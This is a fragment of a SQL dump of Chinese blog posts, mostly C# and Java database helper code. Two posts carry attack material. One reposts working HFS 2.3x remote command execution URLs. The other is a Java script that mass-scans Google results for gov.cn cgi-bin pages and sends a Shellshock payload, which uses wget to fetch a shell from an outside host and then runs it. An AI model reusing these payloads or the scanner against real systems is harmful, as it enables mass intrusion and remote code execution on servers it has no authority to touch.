System.Collections.Generic;\nusing System.Linq;\nusing System.Web;\nusing System.Configuration;\nusing System.Data;\nusing System.Data.SqlClient;\n/// &lt;summary&gt;\n/// 数据库操作帮助类\n/// yzmm\n/// &lt;/summary&gt;\npublic class SqlHelp\n{\n    private SqlConnection conn = null;\n    private SqlCommand cmd = null;\n    private SqlDataReader sdr = null;\n	public SqlHelp()\n	{\n        string connstr = ConfigurationManager.ConnectionStrings[&quot;dataSource&quot;].ConnectionString;\n        conn = new SqlConnection(connstr);\n	}\n    /// &lt;summary&gt;\n    /// 获取数据库连接\n    /// &lt;/summary&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    private SqlConnection getConnection()\n    {\n        if (conn.State == ConnectionState.Closed)\n        {\n            conn.Open();\n        }\n        return conn;\n    }\n    /// &lt;summary&gt;\n    /// 更新数据，返回影响行数\n    /// &lt;/summary&gt;\n    /// &lt;param name=&quot;sql&quot;&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    public int executeNonQuery(String sql){\n        try{\n            SqlCommand cmd = new SqlCommand(sql, getConnection());\n            return cmd.ExecuteNonQuery();\n        }catch (Exception ex){\n            throw ex;\n        }finally{\n            if (conn.State == ConnectionState.Open){\n                conn.Close();\n            }\n        }\n    }\n    /// &lt;summary&gt;\n    /// 更新数据，返回影响行数\n    /// &lt;/summary&gt;\n    /// &lt;param name=&quot;cmdText&quot;&gt;&lt;/param&gt;\n    /// &lt;param name=&quot;paras&quot;&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    public int executeNonQuery(string cmdText, SqlParameter[] paras){\n        int res;\n        using (cmd = new SqlCommand(cmdText, getConnection())){\n            cmd.Parameters.AddRange(paras);\n            res = cmd.ExecuteNonQuery();\n        }\n        return res;\n    }\n    /// &lt;summary&gt;\n    /// 查询数据返回DataTable\n    /// &lt;/summary&gt;\n    /// &lt;param name=&quot;sql&quot;&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    public DataTable executeQueryReader(string sql, SqlParameter[] paras)\n    {\n        DataTable dt = new DataTable();\n        cmd = new SqlCommand(sql, getConnection());\n        if (paras != null &amp;&amp; paras.Length &gt; 0)\n        {\n            cmd.Parameters.AddRange(paras);\n        }\n        using (sdr = cmd.ExecuteReader(CommandBehavior.CloseConnection))\n        {\n            dt.Load(sdr);\n        }\n        return dt;\n    }\n    /// &lt;summary&gt;\n    /// 查询数据库，返回单个结果object\n    /// &lt;/summary&gt;\n    /// &lt;param name=&quot;sql&quot;&gt;&lt;/param&gt;\n    /// &lt;param name=&quot;paras&quot;&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    public object executeQueryScalar(string sql, SqlParameter[] paras)\n    {\n        cmd = new SqlCommand(sql, getConnection());\n        if (paras != null &amp;&amp; paras.Length &gt; 0)\n        {\n            cmd.Parameters.AddRange(paras);\n        }\n        return cmd.ExecuteScalar();\n    }\n}</pre>', null, '2014-09-08 22:50:10', '1', '528', null, '0', '2014-09-08 23:07:31'), ('1462', '1', '10', 'asp.net SqlDataSource 预编译 动态SQL搜索', '园长', '配置SqlDataSource1，搜索的一般需要动态查询，为了解决拼SQL问题，可以采用预编译。参考：<a href=\"http://www.cnblogs.com/qqingmu/archive/2008/01/08/1031013.html\">SqlDataSource 中 参数动态赋值的方法</a> 和 <a href=\"http://msdn.microsoft.com/zh-cn/dd262209\">使用 SqlDataSource 进行带参数的查询</a>\n<pre class=\"brush: csharp; gutter: true\">protected void Button1_Click(object sender, EventArgs e)\n    {\n        string id = TextBox1.Text.ToString();\n        string orgName = TextBox2.Text.ToString();\n        this.SqlDataSource1.SelectParameters.Clear();\n        string sql = &quot;SELECT * FROM sys_user WHERE 1 = 1 &quot;;\n        if(id!=null &amp;&amp; !&quot;&quot;.Equals(id)){\n            sql += &quot; and id= @id &quot;;\n            this.SqlDataSource1.SelectParameters.Add(&quot;id&quot;, System.TypeCode.Object, id);\n        }\n        if (orgName != null &amp;&amp; !&quot;&quot;.Equals(orgName))\n        {\n            sql += &quot; and org_name like &#039;%&#039; + @orgName + &#039;%&#039; &quot;;\n            this.SqlDataSource1.SelectParameters.Add(&quot;orgName&quot;, System.TypeCode.String, orgName);\n        }\n        SqlDataSource1.SelectCommand = sql;\n        this.SqlDataSource1.DataBind();\n        this.GridView1.DataBind();\n    }</pre>', null, '2014-09-08 23:00:53', '1', '536', null, '0', '2014-09-08 23:00:53'), ('1466', '1', '3', 'servlet http异常', '园长', 'response.sendError可以自定义当前页面http错误状态，HttpServletResponse定义了常规的HTTP错误状态码。例如给浏览器返回一个403错误：\n<pre class=\"brush: java; gutter: true\">public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n	response.sendError(HttpServletResponse.SC_FORBIDDEN, &quot;禁止使用GET请求.&quot;);\n}</pre>\n<p><h1></h1></p>\n<p><h1>HTTP Status 403 - 禁止使用GET请求.</h1></p>\n<p><hr noshade=\"noshade\" size=\"1\" /></p>\n<p><b>type</b> Status report</p>\n<p><b>message</b> <span style=\"text-decoration: underline;\">禁止使用GET请求.</span></p>\n<p><b>description</b> <span style=\"text-decoration: underline;\">Access to the specified resource (禁止使用GET请求.) has been forbidden.</span></p>\n<p><hr noshade=\"noshade\" size=\"1\" /></p>\n<p><h3>Apache Tomcat/7.0.29</h3></p>', null, '2014-09-09 22:55:04', '1', '514', null, '0', '2014-09-09 22:57:36'), ('1470', '5', '10', '[转] HFS 2.3x 远程命令执行', 'Anonymous', '从某论坛看见的，转载部分：\n<p>这个程序在国内用的特别多，特别是那些抓肉鸡的黑阔。</p>\n<p>http://localhost:80/?search==%00{.exec|cmd.}</p>\n<p>http://localhost:80/search=%00{.exec|cmd.}</p>\n<p>注：有些版本search前面是没有?的。</p>\n<p>测试部分：</p>\n<p>百度搜HFS默认就是2.3x版本，执行echo测试成功：</p>\n<p>http://localhost:8080/?search==%00{.exec|cmd.exe%20/c%20echo&gt;c:/1.txt%20123.}</p>\n<p>google hack了一下，发现一个抓鸡黑阔：</p>\n<p><img class=\"alignnone size-full wp-image-1476\" src=\"http://javaweb.org/wp-content/uploads/2014/09/1.jpg\" alt=\"1\" width=\"1141\" height=\"791\" /></p>\n<p>。。。。。。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/09/2.jpg\"><img class=\"alignnone size-full wp-image-1474\" src=\"http://javaweb.org/wp-content/uploads/2014/09/2.jpg\" alt=\"2\" width=\"1153\" height=\"768\" /></a></p>\n<p>已测试官方最新版，一样存在。</p>\n<p><img class=\"alignnone size-full wp-image-1473\" src=\"http://javaweb.org/wp-content/uploads/2014/09/3.jpg\" alt=\"3\" width=\"955\" height=\"737\" /></p>\n<p>撒旦：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/09/4.jpg\"><img class=\"alignnone size-full wp-image-1478\" src=\"http://javaweb.org/wp-content/uploads/2014/09/4.jpg\" alt=\"4\" width=\"1021\" height=\"666\" /></a></p>\n<p>测试某表弟的抓鸡服务器同样XXOO了。。</p>\n<p><a href=\"http://zone.wooyun.org/content/15239\">带回显的HFS利用方法，抛砖引玉</a></p>\n<p>http://localhost:8080/?search==%00{.exec|cmd.exe%20/c%20whoami&gt;1.txt.}{.cookie|2|value={.load|1.txt.}.}</p>', null, '2014-09-14 01:36:32', '1', '695', null, '0', '2014-09-17 02:20:10'), ('1483', '1', '3', 'URLClassLoader 加载外部jar获取 JarFile(HTTP)问题(JarURLConnection)', '园长', '当通过URLClassLoader去load一个外部的jar(HTTP)后获取这个jar实体对象会有一点小问题。正常情况下：\n<pre class=\"brush: actionscript3; gutter: true\">URL u = getClass().getProtectionDomain().getCodeSource().getLocation();</pre>\n即可获取到当前的jar路径，因为是URLClassLoader所以这里拿到的URI可能是HTTP协议。即：http://xxx.com/xxx.jar。这个时候如果：\n<pre class=\"brush: java; gutter: true\">JarURLConnection juc = (JarURLConnection) new URL(name).openConnection();</pre>\n无法从HttpURLConnection转为JarURLConnection：\n<pre class=\"brush: actionscript3; gutter: true\">java.lang.ClassCastException: sun.net.www.protocol.http.HttpURLConnection cannot be cast to java.net.JarURLConnection</pre>\n<p class=\"p1\">API中给出的Demo：</p>\n<pre class=\"brush: actionscript3; gutter: true\">一个JAR实体：\njar:http://www.foo.com/bar/baz.jar!/COM/foo/Quux.class\n一个JAR文件\njar:http://www.foo.com/bar/baz.jar!/\n一个JAR目录\njar:http://www.foo.com/bar/baz.jar!/COM/foo/\n!/ 作为引用分割</pre>\n<p><p class=\"title\" title=\"Class JarURLConnection\"><a href=\"http://docs.oracle.com/javase/7/docs/api/java/net/JarURLConnection.html\"><strong>Class JarURLConnection</strong></a></p></p>\n<p><p class=\"title\" title=\"Class JarURLConnection\">这样写似乎就可以了：</p></p>\n<pre class=\"brush: java; gutter: true\">//URL a = getClass().getResource(&quot;/&quot; + getClass().getName().replace(&#039;.&#039;, &#039;/&#039;) + &quot;.class&quot;);\nURL a = getClass().getResource(&quot;&quot;);\nJarURLConnection juc = (JarURLConnection) a.openConnection();\nJarFile jf = juc.getJarFile();</pre>\n<p><p class=\"title\" title=\"Class JarURLConnection\">测试代码：</p></p>\n<pre class=\"brush: java; gutter: true\">\npackage com.test.hello;\nimport java.io.File;\nimport java.net.JarURLConnection;\nimport java.net.URL;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.Enumeration;\nimport java.util.List;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarFile;\npublic class JarTest {\n	public void getAllClass(File f, Path path, List&lt;String&gt; ls){\n		if(f.isDirectory()){\n			File[] files = f.listFiles();\n			for (int i = 0; i &lt; files.length; i++) {\n				getAllClass(files[i],path,ls);\n			}\n		}else{\n			if(f.toString().endsWith(&quot;.class&quot;)){\n				String classPath = f.toString().replaceFirst(path.toString(), &quot;&quot;);\n				classPath = classPath.startsWith(&quot;/&quot;)?classPath.replaceFirst(&quot;/&quot;, &quot;&quot;).replaceAll(&quot;/&quot;, &quot;.&quot;):classPath;\n				ls.add(classPath.substring(0,classPath.length()-&quot;.class&quot;.length()));\n			}\n		}\n	}\n	public void getClassPath(List&lt;String&gt; ls){\n        try {\n        	URL u = getClass().getProtectionDomain().getCodeSource().getLocation();\n        	if(!&quot;http&quot;.equalsIgnoreCase(u.toURI().getScheme()) &amp;&amp; new File(u.toURI()).isDirectory()){\n        		File f = new File(u.toURI());\n        		getAllClass(f,f.toPath(),ls);\n        	}else{\n        		URL a = getClass().getResource(&quot;&quot;);\n        		JarURLConnection juc = (JarURLConnection) a.openConnection();\n        		JarFile jf = juc.getJarFile();\n                Enumeration&lt;JarEntry&gt; je = jf.entries();\n                while (je.hasMoreElements()) {\n                    JarEntry jar = je.nextElement();\n                    if(jar.getName().endsWith(&quot;.class&quot;)){\n                    	String classPath = jar.getName().replaceAll(&quot;/&quot;, &quot;.&quot;);\n                    	ls.add(classPath.substring(0,classPath.length()-&quot;.class&quot;.length()));\n                    }\n                }\n        	}\n        } catch (Exception e) {\n			e.printStackTrace();\n		}\n	}\n	public static void main(String[] args) {\n		List&lt;String&gt; ls = new ArrayList&lt;String&gt;();\n		new JarTest().getClassPath(ls);\n		for(String s:ls){\n			System.out.println(s);\n		}\n	}\n}\n</pre>', null, '2014-09-21 17:50:46', '1', '557', null, '0', '2014-09-21 20:34:56'), ('1489', '1', '3', 'JDBCTest 命令行下自动load外部数据库驱动并执行SQL语句', '园长', '保存为JDBCTest.java并编译:javac JDBCTest.java 执行：java JDBCTest com.mysql.jdbc.Driver jdbc:mysql://localhost/test root 123456 \"select version()\"\n<p>参数的顺序是驱动包、url、用户名、密码、sql语句。执行结果：</p>\n<p><p class=\"p1\">[<span class=\"s1\">yz@yz:~</span>]$ java JDBCTest com.mysql.jdbc.Driver jdbc:mysql://localhost/test root 123456 \"select version()\"</p></p>\n<p><p class=\"p1\">version()[VARCHAR]</p></p>\n<p><p class=\"p1\">5.6.19</p></p>\n<p><p class=\"p1\">（JDBCTest.java会加载外部的驱动包，所以如果能出外网无需考虑是否存在对应的数据库驱动包）</p></p>\n<p><p class=\"p1\">JDBCTest.java源码：</p></p>\n<pre class=\"brush: java; gutter: true\">import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.lang.reflect.Method;\nimport java.net.URL;\nimport java.net.URLClassLoader;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.ResultSetMetaData;\npublic class JDBCTest {\n	public static void main(String[] args) {\n		try {\n			try {\n				Class.forName(args[0]);\n			} catch (ClassNotFoundException e) {\n				boolean classNotFound = true;\n				BufferedReader br = new BufferedReader(new InputStreamReader(new URL(&quot;http://javaweb.org/jdbc/map.txt&quot;).openStream()));\n				String str = &quot;&quot;;\n				while ((str = br.readLine()) != null) {\n					String[] arr = str.split(&quot;=&quot;);\n					if (arr.length == 2 &amp;&amp; arr[0].trim().equals(args[0])) {\n						try {\n							URLClassLoader ucl = (URLClassLoader) ClassLoader.getSystemClassLoader();\n							Method m = URLClassLoader.class.getDeclaredMethod(&quot;addURL&quot;, URL.class);\n							m.setAccessible(true);\n							m.invoke(ucl, new Object[] { new URL(arr[1]) });\n							Class.forName(arr[0].trim());\n							classNotFound = false;\n							break;\n						} catch (ClassNotFoundException ex) {\n							throw ex;\n						}\n					}\n				}\n				if (classNotFound) {\n					throw e;\n				}\n			}\n			ResultSet rs = DriverManager.getConnection(args[1], args[2], args[3]).prepareStatement(args[4]).executeQuery();\n			ResultSetMetaData rsmd = rs.getMetaData();\n			for (int i = 1; i &lt;= rsmd.getColumnCount(); i++) {\n				System.out.print(rsmd.getColumnName(i) + &quot;[&quot;+ rsmd.getColumnTypeName(i) + &quot;]&quot;+&quot;\\t&quot;);\n			}\n			System.out.println();\n			while (rs.next()) {\n				for (int i = 1; i &lt;= rsmd.getColumnCount(); i++) {\n					if (i &gt; 1) {\n						System.out.print(&quot;\\t&quot;);\n					}\n					System.out.print(rs.getObject(rsmd.getColumnName(i)));\n				}\n			}\n			System.out.println();\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>\n<p>jar包版：</p>\n<p><a href=\"http://pan.baidu.com/s/1nhSvG\">JDBCTest.jar </a></p>\n<p>执行：</p>\n<p><p class=\"p1\">[<span class=\"s1\">yz@yz:Downloads</span>]$ java -jar JDBCTest.jar com.mysql.jdbc.Driver jdbc:mysql://localhost/test root 123456 \"select version()\"</p></p>\n<p><p class=\"p1\">version()[VARCHAR]</p></p>\n<p><p class=\"p1\">5.6.19</p></p>', null, '2014-09-23 16:53:47', '1', '518', null, '0', '2014-09-24 14:50:03'), ('1495', '1', '3', 'CVE-2014-6271 google 批量', '园长', '<pre class=\"brush: java; gutter: true\">import java.io.IOException;\nimport java.net.URLDecoder;\nimport java.util.Queue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport org.jsoup.Connection;\nimport org.jsoup.Jsoup;\nimport org.jsoup.nodes.Document;\nimport org.jsoup.nodes.Element;\nimport org.jsoup.select.Elements;\npublic class Test extends Thread{\n	Queue&lt;String&gt; strQeueu = new LinkedBlockingQueue&lt;String&gt;();\n	public Test(Queue&lt;String&gt; strQeueu){\n		this.strQeueu = strQeueu;\n	}\n	public static String getResponse(String url) throws IOException{\n    	try {\n    		System.out.println(&quot;请求:&quot;+url);\n    		Connection.Response response = Jsoup.connect(url)\n                    .userAgent(&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0&quot;)\n                    .referrer(&quot;http://www.google.com.hk/&quot;)\n                    .userAgent(&quot;() { :; }; /usr/bin/wget xxx.xxx.xxx.xxx/shell1 -O /tmp/shell1 | /bin/chmod 777 /tmp/shell1 | /tmp/shell1&quot;)\n                    .ignoreHttpErrors(true)\n                    .timeout(3000)\n                    .execute();\n    		return response.body();\n    	} catch (IOException e) {\n    		throw e;\n    	}\n    }\n	public void run(){\n		while(true){\n			String str = strQeueu.poll();\n			if(str == null){\n				return ;\n			}\n			try {\n            	getResponse(str);\n			} catch (Exception e) {\n				System.err.println(e);\n			}\n		}\n	}\n	public static void main(String[] args) throws IOException {\n        Document doc = Jsoup.connect(&quot;https://www.google.ws/search?q=filetype:cgi+inurl:cgi-bin+site:gov.cn&amp;num=100&amp;newwindow=1&amp;biw=1440&amp;bih=710&amp;ei=qpojVIrRIJPX8gWU_4GwDg&amp;start=300&amp;sa=N&quot;).userAgent(&quot;Googlebot/2.1 (+http://www.googlebot.com/bot.html)&quot;).timeout(5000).get();\n        Elements element = doc.getElementsByTag(&quot;h3&quot;);\n        Queue&lt;String&gt; ls = new LinkedBlockingQueue&lt;String&gt;();\n        for (Element e : element) {\n            Matcher m= Pattern.compile(&quot;/url\\\\?q=(.*)&amp;sa&quot;).matcher(e.getElementsByTag(&quot;a&quot;).get(0).attr(&quot;href&quot;));\n            if(m.find()){\n                String url = URLDecoder.decode(m.group(1),&quot;UTF-8&quot;);\n                if(url.contains(&quot;cgi&quot;)){\n                	ls.offer(url);\n                }\n            }\n        }\n        ThreadGroup tg = new ThreadGroup(&quot;cgi&quot;);\n        int threadCount = ls.size() &gt; 10 ? 10 : ls.size();\n        while (threadCount &gt; 0) {\n            for (int i = 0; i &lt; threadCount; i++) {\n                threadCount--;\n                new Thread(tg, new Test(ls)).start();\n            }\n            while (true) {\n                if (tg.activeCount() == 0) {\n                    break;\n                }\n            }\n        }\n    }\n}</pre>', null, '2014-09-25 12:34:05', '1', '637', null, '17', '2014-09-25 12:34:05'), ('1499', '1', '3', '[Bug更新]Java 反射JDBC ResultSet自动映射成对应实体', '园长', '[更新]：<span style=\"color:#ff0000;\"><strong>修复了查询字段映射bug，导致结果集数量＝字段*字段数问题。ls.add(c);应该放到for (int i = 1; i &lt; rsm.getColumnCount() + 1; i++) {}外面。</strong></span> \n<p>\n    以前一直用Spring的JdbcTemplate查询数据，JdbcTemplate被封装的及其简单易用。某些时候不太适合使用Spring这样庞大的框架，所以自己封装了个JDBC查询的自动映射类以备后用。实现了一个简单的映射数据库表到实体类数组。\n</p>\n<p>\n    <strong>TableMapping.java：</strong> \n</p>\n<pre class=\"brush: java; gutter: true\">/* \n * Copyright yz 2016-01-14  Email:admin@javaweb.org. \n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.javaweb.core.db;\n\nimport org.javaweb.core.db.annotation.Column;\nimport org.javaweb.core.db.annotation.Entity;\nimport org.javaweb.core.utils.StringUtils;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.ResultSetMetaData;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * 数据表和查询实体类映射，简化查询\n *\n * @author yz\n */\npublic class TableMapping {\n\n    private static TableMapping TableMapping = null;\n\n    /**\n     * 获取 TableMapping 对象\n     *\n     * @return\n     */\n    public static TableMapping getInstance() {\n        if (TableMapping == null) {\n            synchronized (TableMapping.class) {\n                return TableMapping = new TableMapping();\n            }\n        }\n        return TableMapping;\n    }\n\n    /**\n     * 反射获取某类的所有成员变量名和成员变量(Field[])\n     *\n     * @param &lt;T&gt;\n     * @param entityClass\n     * @return\n     */\n    protected &lt;T&gt; Map&lt;String, Field&gt; getFieldsMap(Class&lt;T&gt; entityClass) {\n        Map&lt;String, Field&gt; fieldMap = new HashMap&lt;String, Field&gt;();\n        Field[]            field    = entityClass.getDeclaredFields();\n\n        for (int i = 0; i &lt; field.length; i++) {\n            fieldMap.put(field[i].getName().toLowerCase(), field[i]);\n        }\n        return fieldMap;\n    }\n\n    /**\n     * 反射获取某类及其父类的所有成员变量名和成员变量(Field[])\n     *\n     * @param &lt;T&gt;\n     * @param entityClass\n     * @return\n     */\n    protected &lt;T&gt; Map&lt;String, Field&gt; getAllFieldsMap(Class&lt;T&gt; entityClass) {\n        Map&lt;String, Field&gt; map = new HashMap&lt;String, Field&gt;();\n        Class&lt;?&gt;           c   = entityClass;\n        map.putAll(getFieldsMap(entityClass));\n\n        while (c.getSuperclass() != null) {\n            c = c.getSuperclass();\n            map.putAll(getFieldsMap(c));\n        }\n        return map;\n    }\n\n    /**\n     * 反射获取某类的所有方法名和方法Method[]\n     *\n     * @param &lt;T&gt;\n     * @param entityClass\n     * @return\n     */\n    protected &lt;T&gt; Map&lt;String, Method&gt; getMethodsMap(Class&lt;T&gt; entityClass) {\n        Method[]            method = entityClass.getMethods();\n        Map&lt;String, Method&gt; map    = new HashMap&lt;String, Method&gt;();\n\n        for (int i = 0; i &lt; method.length; i++) {\n            map.put(method[i].getName().toLowerCase(), method[i]);\n        }\n        return map;\n    }\n\n    /**\n     * 反射映射数据库表字段到实体层，需要实体层必须包括成员变量和对应的public set方法 如: private int id; 对应public\n     * void setId(int id);方法 成员变量不考虑大小写，默认会忽略数据库字段下划线。如：user_id 等于userId\n     *\n     * @param &lt;T&gt;\n     * @param connection\n     * @param entityClass 需要返回的实体类类型\n     * @param sql         参数 sql 查询语句\n     * @param arr         可变参数，有则传，没有可忽略\n     * @return\n     * @throws SQLException\n     */\n    protected &lt;T&gt; List&lt;T&gt; tableMapping(Connection connection, String sql, Class&lt;T&gt; entityClass, Object... arr) throws SQLException {\n        List&lt;T&gt; ls = new ArrayList&lt;T&gt;();\n        try {\n            ResultSet           rs        = SqlHelp.executQuery(connection, sql, arr);\n            ResultSetMetaData   rsm       = rs.getMetaData();\n            Map&lt;String, Method&gt; methodMap = getMethodsMap(entityClass);\n            Map&lt;String, Field&gt;  fieldMap  = getAllFieldsMap(entityClass);\n\n            while (rs.next()) {\n                try {\n                    T c = entityClass.newInstance();\n\n                    //反射设值\n                    for (int i = 1; i &lt; rsm.getColumnCount() + 1; i++) {\n                        String columnName    = rsm.getColumnName(i);\n                        String field         = columnName.toLowerCase().replaceAll(\"_\", \"\");\n                        String setColumnName = \"set\" + field;\n                        if (methodMap.containsKey(setColumnName) &amp;&amp; fieldMap.containsKey(field)) {\n                            Method method = methodMap.get(setColumnName);\n                            method.invoke(c, new Object[]{rs.getObject(columnName)});\n                        }\n                    }\n                    ls.add(c);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (SQLException e) {\n            throw e;\n        }\n        return ls;\n    }\n\n    /**\n     * 查询数据库中一条记录并映射成对应的实体类类型 如果查询结果数大于一条抛出数据访问异常\n     *\n     * @param &lt;T&gt;\n     * @param connection\n     * @param sql\n     * @param entityClass\n     * @param arr\n     * @return\n     * @throws SQLException\n     */\n    public &lt;T&gt; T queryForEntity(Connection connection, String sql, Class&lt;T&gt; entityClass, Object... arr) throws SQLException {\n        List&lt;T&gt; ls = tableMapping(connection, sql, entityClass, arr);\n\n        if (ls.size() &gt; 1) {\n            throw new IncorrectResultSizeDataAccessException(ls.size());\n        } else if (ls.size() == 1) {\n            return ls.get(0);\n        } else {\n            return null;\n        }\n    }\n\n    /**\n     * 查询数据库中任意条记录并映射成对应的实体类集合类型\n     *\n     * @param &lt;T&gt;\n     * @param connection\n     * @param sql\n     * @param entityClass\n     * @param arr\n     * @return\n     */\n    public &lt;T&gt; List&lt;T&gt; queryForList(Connection connection, String sql, Class&lt;T&gt; entityClass, Object... arr) {\n        try {\n            return tableMapping(connection, sql, entityClass, arr);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    /**\n     * 映射数据库表实现更新实体类即可更新对应的表，需要先查询出对应的column信息后update\n     *\n     * @param &lt;T&gt;\n     * @param connection\n     * @param obj\n     * @return\n     * @throws Exception\n     */\n    public &lt;T&gt; int update(Connection connection, Object obj) throws Exception {\n        Class&lt;T&gt; entityClass = (Class&lt;T&gt;) obj.getClass();\n        if (entityClass.isAnnotationPresent(Entity.class)) {\n            Entity              entity     = entityClass.getAnnotation(Entity.class);\n            StringBuilder       sqlBuilder = new StringBuilder(\"update \");\n            Map&lt;String, Method&gt; methodMap  = getMethodsMap(entityClass);\n            Map&lt;String, Field&gt;  fieldMap   = getAllFieldsMap(entityClass);\n            Object              id         = methodMap.get(\"get\" + entity.id()).invoke(obj, new Object[]{});\n            sqlBuilder.append(entity.table()).append(\" set \").append(entity.id()).append(\"=\").append(\"?\");\n            List&lt;Object&gt; ls = new ArrayList&lt;Object&gt;();\n            ls.add(id);\n\n            for (String str : fieldMap.keySet()) {\n                String field = str.toLowerCase();\n\n                if (!entity.id().equals(field) &amp;&amp; methodMap.containsKey(\"set\" + field) &amp;&amp; methodMap.containsKey(\"get\" + field)) {\n                    Method  method     = methodMap.get(\"set\" + str);\n                    String  columnName = field;//初始化列名为field的值\n                    boolean updatable  = true;\n\n                    if (method.isAnnotationPresent(Column.class)) {\n                        Column column = method.getAnnotation(Column.class);\n                        columnName = column.name();\n                        updatable = column.updatable();//是否允许更新\n                    }\n\n                    if (updatable) {\n                        Method getMethod = methodMap.get(\"get\" + str);\n                        sqlBuilder.append(\", \").append(columnName).append(\"=\").append(\"?\");\n                        ls.add(getMethod.invoke(obj, new Object[]{}));\n                    }\n                }\n            }\n\n            sqlBuilder.append(\" where \").append(entity.id()).append(\"=\").append(\"? \");\n            ls.add(id);\n            return SqlHelp.executUpdate(connection, sqlBuilder.toString(), ls.toArray(new Object[ls.size()]));\n        }\n        return 0;\n    }\n\n    /**\n     * 保存数据，如果某个field不需要保存需在其set方法上添加@Column(updatable = false)\n     *\n     * @param &lt;T&gt;\n     * @param connection\n     * @param obj\n     * @return\n     * @throws Exception\n     */\n    public &lt;T&gt; int save(Connection connection, Object obj) throws Exception {\n        Class&lt;T&gt; entityClass = (Class&lt;T&gt;) obj.getClass();\n        if (entityClass.isAnnotationPresent(Entity.class)) {\n            Entity              entity     = entityClass.getAnnotation(Entity.class);\n            StringBuilder       sqlBuilder = new StringBuilder(\"insert into \");\n            Map&lt;String, Method&gt; methodMap  = getMethodsMap(entityClass);\n            Map&lt;String, Field&gt;  fieldMap   = getAllFieldsMap(entityClass);\n            Object              id         = methodMap.get(\"get\" + entity.id()).invoke(obj, new Object[]{});\n            sqlBuilder.append(entity.table()).append(\" (\");\n            List&lt;Object&gt; ls         = new ArrayList&lt;Object&gt;();\n            List&lt;String&gt; columnList = new ArrayList&lt;String&gt;();\n\n            for (String str : fieldMap.keySet()) {\n                String field = str.toLowerCase();\n\n                if (!entity.id().equals(field) &amp;&amp; methodMap.containsKey(\"set\" + field) &amp;&amp; methodMap.containsKey(\"get\" + field)) {\n                    Method  method     = methodMap.get(\"set\" + str);\n                    String  columnName = field;//初始化列名为field的值\n                    boolean updatable  = true;\n\n                    if (method.isAnnotationPresent(Column.class)) {\n                        Column column = method.getAnnotation(Column.class);\n                        columnName = column.name();\n                        updatable = column.updatable();//是否允许更新\n                    }\n\n                    if (updatable) {\n                        columnList.add(columnName);\n                        Method getMethod = methodMap.get(\"get\" + str);\n                        ls.add(getMethod.invoke(obj, new Object[]{}));\n                    }\n                }\n            }\n            sqlBuilder.append(StringUtils.join(columnList, \",\")).append(\") values (\");\n            for (int i = 0; i &lt; ls.size(); i++) {\n                if (i &gt; 0) {\n                    sqlBuilder.append(\",\");\n                }\n                sqlBuilder.append(\"?\");\n            }\n            sqlBuilder.append(\")\");\n            return SqlHelp.executUpdate(connection, sqlBuilder.toString(), ls.toArray(new Object[ls.size()]));\n        }\n        return 0;\n    }\n\n    /**\n     * 通过主键获取单个实体\n     *\n     * @param &lt;T&gt;\n     * @param connection\n     * @param entityClass\n     * @param id\n     * @return\n     * @throws SQLException\n     */\n    public &lt;T&gt; T getEntity(Connection connection, Class&lt;T&gt; entityClass, Object id) throws SQLException {\n        if (entityClass.isAnnotationPresent(Entity.class)) {\n            Entity entity = entityClass.getAnnotation(Entity.class);\n            String sql    = \"select * from \" + entity.table() + \" where \" + entity.id() + \"=\" + id;\n            return queryForEntity(connection, sql, entityClass);\n        } else {\n            return null;\n        }\n    }\n\n}\n</pre>\n<pre class=\"brush: java; gutter: true\">/* \n * Copyright yz 2016-01-14  Email:admin@javaweb.org. \n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.javaweb.core.db;\n\nimport com.sun.rowset.CachedRowSetImpl;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.Iterator;\nimport java.util.List;\n\npublic class SqlHelp {\n\n    /**\n     * 执行任意的SQL查询语句并返回结果集\n     *\n     * @param connection 一个已打开的JDBC 连接\n     * @param sql        需要执行的SQL语句\n     * @param prr        SQL语句中参数预编译\n     * @return rs SQL查询结果集\n     * @throws SQLException\n     */\n    public static ResultSet executQuery(Connection connection, String sql, Object... prr) throws SQLException {\n        PreparedStatement pstt = null;\n        ResultSet         rs   = null;\n\n        try {\n            pstt = connection.prepareStatement(sql);\n            CachedRowSetImpl cachedRowSetImpl = new CachedRowSetImpl();\n            for (int i = 